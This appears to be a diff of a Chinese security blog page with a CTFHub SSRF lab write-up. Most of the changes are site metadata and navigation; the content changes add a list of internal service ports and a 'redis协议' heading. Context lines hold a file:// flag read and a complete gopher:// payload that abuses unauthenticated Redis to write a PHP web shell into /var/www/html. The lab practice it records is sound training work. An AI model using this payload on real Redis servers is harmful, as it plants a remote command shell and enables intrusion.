@@ -28,7 +28,7 @@
   <meta name="description" content="ssrf-ctfhub什么是 SSRF?攻击者从外网通过 SSRF 攻击访问到内网，接着对内网的应用展开攻击，这些应用包括但不限于 MySQL，redis，SMTP 等等 …… SSRF (全称：Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。  正是因为它">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ssrf-ctfhub">
-<meta property="og:url" content="https://hanggerui88.github.io/2024/04/25/ssrf-ctfhub/index.html">
+<meta property="og:url" content="https://hanggerui88.github.io/2024/04/25/ssrf/ssrf-ctfhub/index.html">
 <meta property="og:site_name" content="Blog">
 <meta property="og:description" content="ssrf-ctfhub什么是 SSRF?攻击者从外网通过 SSRF 攻击访问到内网，接着对内网的应用展开攻击，这些应用包括但不限于 MySQL，redis，SMTP 等等 …… SSRF (全称：Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。  正是因为它">
 <meta property="og:locale" content="en_US">
@@ -44,7 +44,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404242203397.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404242203519.png">
 <meta property="article:published_time" content="2024-04-25T13:18:08.000Z">
-<meta property="article:modified_time" content="2024-04-24T17:38:26.888Z">
+<meta property="article:modified_time" content="2024-04-26T20:11:54.753Z">
 <meta property="article:author" content="hanggerui88">
 <meta property="article:tag" content="ssrf-ctfhub">
 <meta name="twitter:card" content="summary">
@@ -196,11 +196,11 @@
 
         <div id="content" class="outer">
           
-          <section id="main"><article id="post-ssrf-ctfhub" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main"><article id="post-ssrf/ssrf-ctfhub" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner">
     <div class="article-meta">
       <div class="article-date wow slideInLeft">
-  <a href="/2024/04/25/ssrf-ctfhub/" class="article-date-link">
+  <a href="/2024/04/25/ssrf/ssrf-ctfhub/" class="article-date-link">
     <time datetime="2024-04-25T13:18:08.000Z" itemprop="datePublished">2024-04-25</time>
   </a>
 </div>
@@ -243,6 +243,10 @@
 
 <h3><span id="端口扫描">端口扫描</span></h3><p>8000-9000</p>
 <p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404241233525.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MySQL: 3306</span><br><span class="line">PostgreSQL: 5432</span><br><span class="line">FastCGI: 是由Web服务器（如Nginx或Apache）通过FastCGI协议与FastCGI进程通信。</span><br><span class="line">Redis: 6379</span><br><span class="line">SMTP (邮件服务): 25 (SMTP), 465 (SMTPS), 587 (submission) 是常见的SMTP端口，但具体使用哪个取决于配置。</span><br><span class="line">Zabbix: 10051 (Zabbix agent), 10052 (Zabbix server)</span><br><span class="line">Pymemcache: 由应用程序与Memcached服务器通信，通常使用默认的Memcached端口11211。</span><br><span class="line">Rbmemcache: 同样，Rbmemcache也是Memcached的Ruby客户端库，通常使用默认的Memcached端口11211。</span><br><span class="line">Phpmemcache: Phpmemcache是Memcached的PHP客户端库，同样通常使用默认的Memcached端口11211。</span><br><span class="line">Dmpmemcache: 我无法确定这个服务，但如果它也是Memcached的客户端库，那么它可能也使用默认的Memcached端口11211。</span><br></pre></td></tr></table></figure>
+
+
+
 <h3><span id="post请求">POST请求</span></h3><p>访问： </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>
 
@@ -313,7 +317,7 @@
 <blockquote>
 <p>因为是get传参，需要再原基础payload基础上在进行url编码</p>
 </blockquote>
-<h3><span id></span></h3><p> 主要利用redis未授权访问 </p>
+<h3><span id="redis协议">redis协议</span></h3><p> 主要利用redis未授权访问 </p>
 <p>还是利用<a target="_blank" rel="noopener" href="https://codechina.csdn.net/mirrors/tarunkant/Gopherus/-/tree/master">Gopherus</a>工具生成payload,直接打，记得再次编码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -360,7 +364,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://hanggerui88.github.io/2024/04/25/ssrf-ctfhub/" data-id="clvjshksj000044hq3bjfdmfq" data-title="ssrf-ctfhub" class="article-share-link">Share</a>
+      <a data-url="https://hanggerui88.github.io/2024/04/25/ssrf/ssrf-ctfhub/" data-id="clvjt0qb60003u0hq8hscheje" data-title="ssrf-ctfhub" class="article-share-link">Share</a>
       
       
       
@@ -380,14 +384,14 @@
         
           
           
-            <img data-src="/images/banner.jpg" data-sizes="auto" alt="DASCTF X GFCTF 2024" class="lazyload">
+            <img data-src="/images/banner.jpg" data-sizes="auto" alt="ssh-keygen 公钥登录服务器" class="lazyload">
           
         
-        <a href="/2024/04/27/wp/DASCTF%20X%20GFCTF%202024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/"></a>
+        <a href="/2024/04/25/ssrf/Redis%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"></a>
         <div class="article-nav-caption">Newer</div>
         <h3 class="article-nav-title">
           
-            DASCTF X GFCTF 2024
+            ssh-keygen 公钥登录服务器
           
         </h3>
       </div>
@@ -397,14 +401,14 @@
       
         
         
-          <img data-src="/images/banner.jpg" data-sizes="auto" alt="fastjson反序列化" class="lazyload">
+          <img data-src="/images/banner.jpg" data-sizes="auto" alt="POJONode#toString" class="lazyload">
         
       
-      <a href="/2024/04/22/java/1fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"></a>
+      <a href="/2024/04/22/java/2Jackson/"></a>
       <div class="article-nav-caption">Older</div>
       <h3 class="article-nav-title">
         
-          fastjson反序列化
+          POJONode#toString
         
       </h3>
     </div>
@@ -427,7 +431,7 @@
     
       <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
   <h3 class="toc-title">Contents</h3>
-  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">ssrf-ctfhub</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">什么是 SSRF?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">ssrf 漏洞产生原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">ctfhub</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.1.</span> <span class="toc-text">内网访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.2.</span> <span class="toc-text">伪协议读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">file:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.3.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.4.</span> <span class="toc-text">POST请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">gopher:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.5.</span> <span class="toc-text">上传文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.6.</span> <span class="toc-text">FastCGI协议 </span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.7.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.8.</span> <span class="toc-text">URL Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.9.</span> <span class="toc-text">数字IP Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.10.</span> <span class="toc-text">302跳转 Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.11.</span> <span class="toc-text">DNS重绑定 Bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text">防御</span></a></li></ol></li></ol></div>
+  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">ssrf-ctfhub</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">什么是 SSRF?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">ssrf 漏洞产生原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">ctfhub</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.1.</span> <span class="toc-text">内网访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.2.</span> <span class="toc-text">伪协议读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">file:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.3.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.4.</span> <span class="toc-text">POST请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">gopher:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.5.</span> <span class="toc-text">上传文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.6.</span> <span class="toc-text">FastCGI协议 </span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.7.</span> <span class="toc-text">redis协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.8.</span> <span class="toc-text">URL Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.9.</span> <span class="toc-text">数字IP Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.10.</span> <span class="toc-text">302跳转 Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.11.</span> <span class="toc-text">DNS重绑定 Bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text">防御</span></a></li></ol></li></ol></div>
 </div>
 </div>
       <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -438,7 +442,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Posts</div>
-    <div class="sidebar-state-number">22</div>
+    <div class="sidebar-state-number">23</div>
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
@@ -446,7 +450,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">22</div>
+    <div class="sidebar-state-number">23</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -516,10 +520,10 @@
       
         <div>
           <span class="icon-brush"></span>
-          30.6k
+          31k
           &nbsp;|&nbsp;
           <span class="icon-coffee"></span>
-          02:23
+          02:25
         </div>
       
       
@@ -546,7 +550,7 @@
     
       <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
   <h3 class="toc-title">Contents</h3>
-  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">ssrf-ctfhub</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">什么是 SSRF?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">ssrf 漏洞产生原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">ctfhub</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.1.</span> <span class="toc-text">内网访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.2.</span> <span class="toc-text">伪协议读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">file:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.3.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.4.</span> <span class="toc-text">POST请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">gopher:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.5.</span> <span class="toc-text">上传文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.6.</span> <span class="toc-text">FastCGI协议 </span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.7.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.8.</span> <span class="toc-text">URL Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.9.</span> <span class="toc-text">数字IP Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.10.</span> <span class="toc-text">302跳转 Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.11.</span> <span class="toc-text">DNS重绑定 Bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text">防御</span></a></li></ol></li></ol></div>
+  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">ssrf-ctfhub</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">什么是 SSRF?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">ssrf 漏洞产生原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">ctfhub</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.1.</span> <span class="toc-text">内网访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.2.</span> <span class="toc-text">伪协议读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">file:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.3.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.4.</span> <span class="toc-text">POST请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">gopher:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.5.</span> <span class="toc-text">上传文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.6.</span> <span class="toc-text">FastCGI协议 </span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.7.</span> <span class="toc-text">redis协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.8.</span> <span class="toc-text">URL Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.9.</span> <span class="toc-text">数字IP Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.10.</span> <span class="toc-text">302跳转 Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.11.</span> <span class="toc-text">DNS重绑定 Bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text">防御</span></a></li></ol></li></ol></div>
 </div>
 </div>
       <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -557,7 +561,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Posts</div>
-    <div class="sidebar-state-number">22</div>
+    <div class="sidebar-state-number">23</div>
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
@@ -565,7 +569,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">22</div>
+    <div class="sidebar-state-number">23</div>
   </div>
 </div>
 <div class="sidebar-social">
